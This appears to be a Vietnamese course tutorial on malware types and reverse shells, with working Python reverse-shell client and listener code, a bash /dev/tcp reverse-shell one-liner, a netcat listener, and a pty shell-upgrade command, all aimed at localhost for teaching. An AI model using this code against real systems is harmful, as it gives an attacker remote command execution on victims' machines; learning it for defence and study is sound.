# 1. Chương trình độc hại
Chương trình độc hại là những chương trình máy tính, có thể viết bằng ngôn ngữ biên dịch hoặc thông dịch, được viết nhằm phục vụ mục đích xấu.
## Hình thức lây nhiễm
- Tự lây lan bằng cách nhiễm độc vào một file hợp lệ, hoặc thông qua các thiết bị chia sẻ dữ liệu hoặc thông qua lỗ hổng bảo mật: virus, worm 
- Sử dụng Social Engineering, giả mạo là một chương trình không độc hại
- Tấn công vào credential yếu, credential được tái sử dụng, bị lộ lọt.

## Phương pháp qua mặt hệ thống bảo mật
- Dropper: Là một chương trình tải mã độc về máy.
- Fileless Malware: Thực thi mã độc trong memory để tránh scan file hoặc file forensics
- Hacktool: sử dụng các chương trình hợp lệ (ví dụ psexec) để threat actor thao túng hệ thống
- Packer / Crypter: Sử dụng các phương pháp mã hóa để che giấu đoạn mã độc trong file.
- Rootkit: Sử dụng kỹ thuật hooking để che giấu sự tồn tại trên hệ thống.

## Mục đích tấn công
- Điều khiển máy tính từ xa: Trojan, Backdoor, Virus, Worm
- Đánh cắp dữ liệu: Trojan, Spyware, Stealer, Keylogger
- Chiếm dụng tài nguyên trái phép: CoinMiner, Botnet
- Cài đặt các URL hoặc application, extension trái phép: Adware, PUP
- Phá hoại dữ liệu hoặc hệ thống hạ tầng: Destructor
=> Một phần mềm độc hại có thể bao gồm nhiều chức năng. Vì vậy, việc phân chia theo category chỉ mang tính chất tương đối.

## Vài thông tin thú vị
- [Samy Worm](https://en.wikipedia.org/wiki/Samy_(computer_worm)) do [Samy Kamkar](https://en.wikipedia.org/wiki/Samy_Kamkar) viết đã khai thác lỗ hổng Stored XSS trong nền tảng mạng xã hội MySpace. Chỉ sau 20 giờ, có hơn một triệu người dùng đã bị lây nhiễm.
- Virus [Conficker](https://en.wikipedia.org/wiki/Conficker) khai thác lỗ hổng [MS08-067](https://www.cve.org/CVERecord?id=CVE-2008-4250) trong dịch vụ SMB của Windows OS và sử phương thức tấn công brute force để lây nhiễm.
- Virus [Mirai](https://en.wikipedia.org/wiki/Mirai_(malware)) và các biến thể của nó tấn công các hệ thống máy chủ Linux, kể cả các thiết bị mạng chạy Linux, để tạo mạng lưới Botnet. Mirai và các biến thể sử dụng tấn công brute force vào dịch vụ SSH, kết hợp với các lỗ hổng trong dịch vụ quản trị của thiết bị mạng để lây lan. Mỗi biến thể sử dụng một số các exploit khác nhau.
- Worm [Stuxnet](https://en.wikipedia.org/wiki/Stuxnet) là một chương trình được thiết kế đặc biệt để tấn công vào những cá nhân và hệ thống công nghiệp thuộc chương trình hạt nhân của Iran. Stuxnet và các biến thể có độ phức tạp cao đến mức các chuyên gia phân tích mã độc thời đó đánh giá là "vũ khí mạng". Có thể tìm hiểu sâu hơn trong [Phim tài liệu Zero Days](https://www.imdb.com/title/tt5446858/) và quyển sách [Vũ khí hoàn hảo](https://www.amazon.com/Perfect-Weapon-Sabotage-Fear-Cyber/dp/0451497899)



## Reverse shell
Reverse Shell là chương trình cho phép:
- Máy nạn nhân tự kết nối ngược về máy Threat Actor.
- Threat actor điều khiển từ xa qua lệnh hệ thống.

Ví dụ: Reverse shell sử dụng netcat
1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
2. Client (victim) kết nối đến port 4444: `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` *Những phiên bản mới của netcat không sử dụng được option `-e`. Có thể sử dụng thay thế bằng `ncat`.

<details>
<summary>Tại sao lại sử dụng Reverse Shell?</summary>

- Chương trình có thể cần được cho phép mới có thể mở port. Ví dụ: trên Windows, Windows Firewall sẽ hiện dialog hỏi người dùng có cho phép ứng dụng mở port không.
- Máy chủ có thể nằm trong một phân vùng mạng nội bộ, được NAT port ra ngoài. Vì vậy, việc mở port bên trong thành công không đồng nghĩa với việc threat actor có thể điều khiển từ xa được.
- Đối với những giải pháp kiểm soát outbound cơ bản, các giải pháp có thể chỉ hoạt động ở mức độ kiểm soát port outbound. Ví dụ: cho phép kết nối ra internet qua port 53 hoặc 80/443. Threat actor có thể lợi dụng chính sách này để thiết lập kết nối.
</details>

- Reverse shell có thể nằm trong những category nào của malware?
- Bind shell là gì? So sánh với Reverse Shell?

# 2. Socket Programming và sử dụng với Reverse Shell
## 2.1. Socket Programming cơ bản
Socket Programming là hình thức lập trình nhằm giao tiếp dữ liệu thông qua socket. Lập trình socket có thể dùng giao thức TCP hoặc UDP nằm ở tầng 4 mô hình OSI, hoặc sử dụng các giao thức đặc biệt hơn ví dụ Unix Domain Name Socket.

Quy trình chung:
1. Server bind một port trên một interface (hoặc sử dụng 0.0.0.0 cho toàn bộ interface) và listen.
2. Client kết nối đến server thông qua địa chỉ IP và port
3. Giao tiếp bằng việc gửi - nhận dữ liệu.
4. Kết thúc phiên kết nối, đóng kết nối (server vẫn có thể sử dụng port chứ không ngừng hẳn)

## Code demo: Socket programming
- Code phía server:

```
import socket

HOST = '127.0.0.1'  # Giao diện loopback tiêu chuẩn (localhost)
PORT = 9191         # Cổng để lắng nghe

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. Gán socket với địa chỉ và cổng
server_socket.bind((HOST, PORT))

# 3. Bắt đầu lắng nghe kết nối đến (tối đa 1 kết nối đang chờ)
server_socket.listen(1)
print(f"[*] Server đang lắng nghe trên {HOST}:{PORT}")

# Chờ và chấp nhận kết nối từ client
conn, addr = server_socket.accept()
print(f"[*] Đã chấp nhận kết nối từ: {addr[0]}:{addr[1]}")

try:
    # Vòng lặp chính để nhận và xử lý dữ liệu
    while True:
        # Nhận dữ liệu (tối đa 1024 bytes)
        data = conn.recv(1024)
        if not data:
            # Client đóng kết nối
            print("[-] Client đã đóng kết nối.")
            break

        # Giải mã dữ liệu nhận được (từ bytes sang string)
        client_data = data.decode('utf-8')

        # In ra màn hình theo yêu cầu
        print(f"Client gửi: <{client_data}>")

        # (Tùy chọn) Gửi phản hồi lại client
        conn.sendall(f"Server đã nhận: {client_data}".encode('utf-8'))

except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng kết nối và socket
    conn.close()
    server_socket.close()
    print("[*] Server đã tắt.")

```
- Code phía client:
```
import socket

# Cấu hình Host và Port của Server
HOST = '127.0.0.1'  # Địa chỉ server
PORT = 9191         # Cổng server

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # 2. Kết nối đến Server
    client_socket.connect((HOST, PORT))
    print(f"[*] Đã kết nối đến Server {HOST}:{PORT}")

    # Vòng lặp chính để gửi dữ liệu
    while True:
        # Nhận input từ người dùng
        message = input("Nhập tin nhắn để gửi đến server (gõ 'quit' để thoát): ")

        if message.lower() == 'quit':
            break

        # Mã hóa và gửi dữ liệu đến server
        client_socket.sendall(message.encode('utf-8'))

        # (Tùy chọn) Nhận phản hồi từ server
        response = client_socket.recv(1024)
        print(f"Server phản hồi: {response.decode('utf-8')}")

except ConnectionRefusedError:
    print("Lỗi: Không thể kết nối. Hãy đảm bảo Server đang chạy.")
except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng socket
    client_socket.close()
    print("[*] Client đã tắt.")
```


<details>
<summary>Brainstorm: Khi đối chiếu Reverse Shell vào socket programming, đâu là client, dâu là server?</summary>

Trong reverse shell:

- Victim = client, khởi tạo kết nối.
- Threat actor = server, lắng nghe connection.
</details>

## Sử dụng socket programming để viết reverse shell
Ý tưởng:
- Phía server lấy input và gửi về phía client:
```
command = input("Shell> ")
conn.send(command.encode('utf-8') + b'\n')
```

- Phía client có thể sử dụng thư viện subprocess để thực thi lệnh hệ thống
```
import subprocess

output = subprocess.run(command, shell=True)
```
Như vậy, bên phía client sẽ nhận lệnh, thực thi và gửi lại phía server kết quả
```
command = s.recv(1024).decode('utf-8')
output = subprocess.run(command, check=True)
s.sendall(output.stdout)
```

<details>
<summary>Code phía server</summary>

```
import socket
import sys

# Cấu hình lắng nghe
LISTEN_HOST = '0.0.0.0' # Lắng nghe trên tất cả các giao diện
LISTEN_PORT = 9191      # Phải khớp với cổng trong reverse shell


def listener_server():
    # 1. Tạo socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Cho phép sử dụng lại địa chỉ/cổng ngay lập tức (tránh lỗi "Address already in use")
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 2. Gán và lắng nghe
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(1)
    print(f"[*] Server đang lắng nghe trên cổng {LISTEN_PORT}...")

    # 3. Chờ và chấp nhận kết nối
    conn, addr = server_socket.accept()
    print(f"[*] Reverse Shell đã kết nối từ: {addr[0]}:{addr[1]}")

    try:
        # Vòng lặp giao tiếp chính
        while True:
            # Nhận lệnh từ người dùng Attacker
            command = input("Shell> ")

            if command.lower() == 'exit':
                conn.send(b'exit\n') # Gửi lệnh exit đến shell (tùy thuộc shell)
                break

            if not command:
                continue

            # Gửi lệnh và thêm ký tự xuống dòng (cần cho shell)
            conn.send(command.encode('utf-8') + b'\n')
            # Nhận và in phản hồi từ Victim
            response = conn.recv(1024).decode('utf-8', errors='ignore')
            print(response)

    except Exception as e:
        print(f"\n[-] Mất kết nối hoặc lỗi xảy ra: {e}")
    finally:
        # Đóng kết nối
        conn.close()
        server_socket.close()
        print("[*] Server đã đóng.")

if __name__ == '__main__':
    listener_server()

```
</details>

<details>
<summary>Code phía client</summary>

```
import socket
import subprocess


# Cấu hình máy Attacker (Server)
ATTACKER_HOST = '127.0.0.1'  # THAY ĐỔI: IP thực tế của máy Attacker
ATTACKER_PORT = 9191         # Cổng Attacker đang lắng nghe

def reverse_shell():
    # 1. Tạo và kết nối socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_HOST, ATTACKER_PORT))

    # Vòng lặp chính để nhận và thực thi lệnh
    while True:
        # 2. Nhận lệnh từ Server (Attacker)
        command = s.recv(1024).decode('utf-8')

        if not command or command.lower() == 'exit':
            s.send(b"[!] Closing.\n")
            break # Thoát khỏi vòng lặp nhận lệnh

        # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
        try:
            # Khởi tạo tiến trình con
            # Sử dụng để thực hiện lệnh như lệnh Shell mà không bị lỗi
            # Redirect stderr ra stdout
            output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ... nhưng đã dùng redirect để lấy cả stdout và stderr
            s.sendall(output.stdout)
        except Exception as e:
            s.send(f"[-] Error: {str(e)}".encode('utf-8'))

    # 5. Đóng socket và nghỉ trước khi kết nối lại
    s.close()

if __name__ == '__main__':
    reverse_shell()

```
</details>

# 3. Interactive Shell và Non-Interactive Shell
## Hạn chế thứ nhất
- Hãy thử nghiệm reverse shell theo 2 kịch bản sau:
    1. Chạy server và client trong code `02.simple_rev_shell`, sử dụng lệnh `ls -lah /usr/bin/`
    2. Sử dụng `netcat` tạo server (ví dụ `nc -nvlp 9191`), và chạy client trong `02.simple_rev_shell`, chạy lệnh `ls -lah /usr/bin/`

<details>
<summary>Kết quả thử nghiệm</summary>

- Khi chạy server viết bằng Py từ ví dụ, kết quả bị thiếu rất nhiều
- Sử dụng `netcat` thì kết quả không bị thiếu.
</details>

<details>
<summary>Phân tích nguyên nhân và phương hướng giải quyết</summary>

- Dòng code `response = conn.recv(1024).decode('utf-8', errors='ignore')` chỉ đọc **1024** bytes từ buffer mạng. Như vậy, kết quả đưa ra màn hình bị thiếu.
- Có cách nào đọc được toàn bộ dữ liệu với điều kiện số lượng byte là rất lớn và không biết trước?
=> Giải thuật: Sử dụng vòng lặp vô hạn để liên tục lấy dữ liệu từ socket với độ dài BUFF_SIZE. Nếu lượng dữ liệu lấy dược có độ dài < BUFF_SIZE, đây là đoạn chunk cuối cùng và break.
</details>

<details>
<summary>Giải quyết vấn đề</summary>
- Giải thuật:

```
while True:
    response = conn.recv(BUFF_SIZE).decode('utf-8')
    print(response, end="")
    if len(response) < BUFF_SIZE:
        break
```
</details>

<details>
<summary>Giải thuật ở trên có lỗi gì không?</summary>

Giải thuật ở trên có 1 điểm yếu trong logic: nếu chunk cuối có độ dài chính xác là `BUFF_SIZE`, cụ thể hơn: `len(data) + len('\n') == BUFF_SIZE`, chương trình tiếp tục thực hiện lấy `conn.recv(1024)` và bị treo.

Nguyên nhân dẫn đến việc bị treo là do [Blocking Mode của socket](https://en.wikipedia.org/wiki/Berkeley_sockets#Blocking_and_non-blocking_mode) không return trừ khi nó nhận được dữ liệu. Trong khi đó, Non-Blocking return bất cứ dữ liệu nào trong buffer và lập tức tiếp tục. Chế độ Non-Blocking có thể gây ra lỗ hổng [Race-Condition](https://en.wikipedia.org/wiki/Race_condition). Tuy nhiên, ta có thể bật chế độ non blocking trong trường hợp này để lấy toàn bộ dữ liệu mà không lo bị treo. Ta sẽ trả lại chế độ blocking như cũ sau khi lấy hết dữ liệu.

Đầu tiên, đưa code trở lại chế độ Blocking. Sử dụng kiểm tra chế độ getblocking để tránh set liên tục
```
if not conn.getblocking():
    conn.setblocking(True)
```

Thêm điều kiện đổi chế độ blocking khi **response** có **length** bằng **BUFF_SIZE**

```
while True:
    try:
        response = conn.recv(BUFF_SIZE).decode('utf-8')
        print(response, end="")

        if len(response) == BUFF_SIZE and conn.getblocking():
            conn.setblocking(False)
        elif len(response) < BUFF_SIZE:
            break
    except BlockingIOError:
        break
```

</details>

<details>
<summary>Code phía client có vấn đề gì gây ảnh hưởng đến tính ổn định không?</summary>

Dòng `output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)` lấy toàn bộ dữ liệu từ output lưu vào 1 biến và gửi đi. Trên lý thuyết, nếu dữ liệu output quá lớn có thể ảnh hưởng đến lượng memory mà client sử dụng, cũng như lưu lượng mạng để truyền tải file.
</details>

## Hạn chế thứ 2.
Đầu tiên, chạy reverse shell với bash `bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/9191 <&1'` rồi thử chạy `vi /tmp/hehe` từ phía server rồi thoát editor. Sau đó thử tương tự nhưng phía client chạy reverse shell bằng py đã viết.

<details>
<summary>Nhận xét sự khác biệt</summary>

Sau lệnh vi, phía server bị treo. Nếu thử list các process trên phía client, ví dụ `ps -aux | grep hehe`, ta thấy process vẫn đang chạy

```
dmknght   150065  0.0  0.0   2580  1536 pts/4    S+   08:05   0:00 /bin/sh -c vi /tmp/hehe
dmknght   150066  0.0  0.0  91704 13568 pts/4    Sl+  08:05   0:00 vi /tmp/hehe
```

Điều này có nghĩa là vì một lý do nào đó, process vẫn đang chạy nhưng phía server không thể điều khiển được. (ngay cả khi sử dụng **Ctrl+C** để stop server, phía client vẫn tiếp tục chạy process cho đến khi bị kill.)
</details>

## Interactive, Non-Interactive và nâng cấp.
Từ [định nghĩa các chế độ hoạt động của bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)#Modes), ta có thể rút ra được vài điểm chính sau:
- Interactive mode (chế độ tương tác), thực hiện lấy dữ liệu từ stdin, đưa stdout và stderr ra stdin.
- Non-Interactive mode (chế độ không tương tác) sẽ thực hiện 1 lệnh hoặc chuỗi lệnh mà không cần người dùng tương tác.

<details>
<summary>Vậy đối với reverse shell như ncat hay bash, tại sao phía server nhận được dữ liệu từ stdout?</summary>

#### Đối với lệnh bash, ta có những điểm sau:
  1. Sử dụng flag `-i` để sử dụng interactive mode
  2. Sử dụng [Tính năng redirection để redirect stdout và stderror tới TCP socket](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error). *Note: Để sử dụng tính năng này, [bash cần được compile với flag --enable-net-redirections](https://unix.stackexchange.com/a/217488)*.
  3. Sử dụng [duplicate file descriptors của redirection trong bash](https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Duplicating-File-Descriptors) để redirect **output của socket** vào **stdin của bash**.

Như vậy, ta có thể sử dụng [procfs](https://en.wikipedia.org/wiki/Procfs) để kiểm tra `file descriptor` của tiến trình đang chạy. Ta có thể so sánh file descriptor của tiến trình terminal emulator mới và reverse shell chạy bằng bash:
- Với tiến trình terminal emulator mới:
  1. Chạy `echo $$` để thấy process ID của chính terminal hiện tại. Ví dụ:
  ```
  └╼dmknght$echo $$
  159636
  ```
  2. Kiểm tra file descriptor trong `procfs`. Đường dẫn có dạng `/proc/<pid>/fd`. Ví dụ: `└╼dmknght$ls -lah /proc/159636/fd`. Kết quả cho rất nhiều file descriptors với ID khác nhau được thể hiện dưới dạng [symlink](https://en.wikipedia.org/wiki/Symbolic_link). Trong đó có 1 số kết quả như:
  ```
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:34 0 -> /dev/pts/6
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:36 1 -> /dev/pts/6
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:36 2 -> /dev/pts/6
  ```
- So sánh với kết quả từ reverse shell:
  ```
  └╼dmknght$ls -lah /proc/157571/fd
  total 0
  dr-x------ 2 dmknght dmknght  4 Dec  9 09:12 .
  dr-xr-xr-x 9 dmknght dmknght  0 Dec  9 09:12 ..
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 0 -> 'socket:[2133132]'
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 1 -> 'socket:[2133132]'
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 2 -> 'socket:[2133132]'
  lrwx------ 1 dmknght dmknght 64 Dec  9 09:12 255 -> /dev/tty
  ```

Như vậy, toàn bộ file descriptor của reverse shell đang được kết nối tới socket. Nếu tiếp tục kiểm tra kết nối này, ta có thể căn cứ vào giá trị ID của socket vừa được list ở trên như sau:
```
└╼dmknght$cat /proc/net/tcp | grep 2133132
56: 0100007F:BEAA 0100007F:23E7 01 00000000:00000000 00:00000000 00000000  1000        0 2133132 1 00000000a90bf9f7 20 0 0 10 -1
```

Đây là giá trị được thể hiện dưới dạng hex. Sử dụng [Format hiển thị của kết nối TCP trong procfs](https://www.kernel.org/doc/Documentation/networking/proc_net_tcp.txt), ta sẽ được connection kết nối `127.0.0.1:48810 -> 127.0.0.1:9191` và các thông tin khác. Ngoài ra, có thể sử dụng lệnh `lsof` để lấy thông tin tương tự. Ví dụ `lsof | grep 2133132` sẽ có kết quả
```
bash      157571                           dmknght    0u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
bash      157571                           dmknght    1u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
bash      157571                           dmknght    2u     IPv4            2133132         0t0      TCP localhost:48810->localhost:9191 (ESTABLISHED)
```

#### Đối với ncat
Đối với ncat, việc sử dụng file redirection có sự khác biệt:

```
└╼dmknght$ls -lah /proc/163259/fd
total 0
dr-x------ 2 dmknght dmknght  6 Dec  9 09:50 .
dr-xr-xr-x 9 dmknght dmknght  0 Dec  9 09:49 ..
lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 0 -> /dev/pts/4
lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 1 -> /dev/pts/4
lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 2 -> /dev/pts/4
lrwx------ 1 dmknght dmknght 64 Dec  9 09:50 3 -> 'socket:[2177954]'
l-wx------ 1 dmknght dmknght 64 Dec  9 09:50 5 -> 'pipe:[2177955]'
lr-x------ 1 dmknght dmknght 64 Dec  9 09:50 6 -> 'pipe:[2177956]'
```

Thật vậy, `ncat` không sử dụng việc redirect stdin và stdout tới pipe. Nguyên nhân là khi [thực hiện lệnh hệ thống](https://github.com/nmap/nmap/blob/master/ncat/ncat_posix.c#L150), `ncat` sử dụng [fork](https://man7.org/linux/man-pages/man2/fork.2.html) để tạo một tiến trình mới và sử dụng [pipe](https://man7.org/linux/man-pages/man2/pipe.2.html) để communicate với nó. Dữ liệu đưa qua socket sử dụng [dup2](https://man7.org/linux/man-pages/man2/dup2.2.html) để sao chép file descriptor của process con và của socket connection.
TODO làm rõ hơn vấn đề redirection vì code của ncat đang chưa clear phần redirection (struct / mảng child_stdin ở đâu ra?)

</details>

<details>
<summary>Liệu thời điểm lấy output có khác nhau không?</summary>
Chạy: `for i in $(seq 1 5); do echo "$i"; sleep 1; done` trên reverse shell và shell thường (hoặc thử reverse shell) => interactive chạy real time còn non-interactive đợi chạy xong, lấy output và gửi
</details>


## Kiểm tra, chuyển đổi sang Interactive Mode
TODO: kiểm tra: `echo $-`
TODO: nâng cấp shell
```
import pty
pty.spawn("/bin/bash")
```
Tuy nhiên, sử dụng command line sẽ khác: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Bài tập:
- Viết reverse shell với python nhưng sử có interactive shell
- Tìm, đọc và giải thích code interactive reverse shell trên C

## Tạo Interactive Reverse Shell